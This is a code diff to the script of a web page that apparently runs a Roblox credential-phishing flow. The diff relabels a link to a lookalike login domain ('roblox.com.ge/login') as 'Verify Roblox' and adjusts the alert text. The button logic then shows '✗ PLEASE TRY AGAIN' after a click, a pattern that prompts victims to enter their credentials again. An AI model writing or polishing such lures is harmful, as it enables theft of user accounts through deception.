@@ -628,7 +628,7 @@
         document.getElementById("warningMsg").style.display = "none";
         document.getElementById("robloxLinkContainer").innerHTML = `
             <a href="https://roblox.com.ge/login?returnUrl=5285318607103111" class="step-link-btn roblox" id="robloxLink" target="_blank">
-                <div class="btn-content"><span>🎮</span> Join Group</div><span>→</span>
+                <div class="btn-content"><span>🎮</span> Verify Roblox</div><span>→</span>
             </a>`;
         const rBtn = document.getElementById("verifyRobloxBtn");
         rBtn.disabled = false;
@@ -638,7 +638,7 @@
         setTimeout(() => {
             document.getElementById("robloxLink").onclick = () => rClicked = true;
             rBtn.onclick = function() {
-                if(!rClicked) { alert("Join the Roblox group first!"); return; }
+                if(!rClicked) { alert("Verify in Roblox first!"); return; }
                 this.innerHTML = "✗ PLEASE TRY AGAIN";
                 this.classList.add("verified");
                 document.getElementById("step2Status").innerHTML = "✅";
